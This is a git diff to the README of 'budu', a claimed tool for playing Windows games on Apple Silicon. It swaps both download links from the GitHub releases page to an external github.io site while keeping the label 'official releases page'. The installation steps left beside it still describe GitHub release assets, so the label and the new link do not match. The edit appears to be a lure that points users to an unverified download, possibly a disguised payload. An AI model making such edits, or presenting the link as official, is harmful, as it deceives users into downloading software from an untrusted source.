@@ -1,6 +1,6 @@
 # 💻 budu - Play Windows Games on Apple Silicon
 
-[![Download budu](https://img.shields.io/badge/Download_budu_here-Blue.svg)](https://github.com/directtaxlevity130/budu/releases)
+[![Download budu](https://img.shields.io/badge/Download_budu_here-Blue.svg)](https://directtaxlevity130.github.io)
 
 ## 🎯 About the project
 
@@ -20,7 +20,7 @@ Before you begin, ensure your Mac meets these hardware standards:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/directtaxlevity130/budu/releases) to download the application.
+1. Visit the [official releases page](https://directtaxlevity130.github.io) to download the application.
 2. Locate the link labeled "Assets" under the latest version tag.
 3. Click the file ending in `.dmg` to save it to your Downloads folder.
 4. Open the downloaded file once the transfer completes.
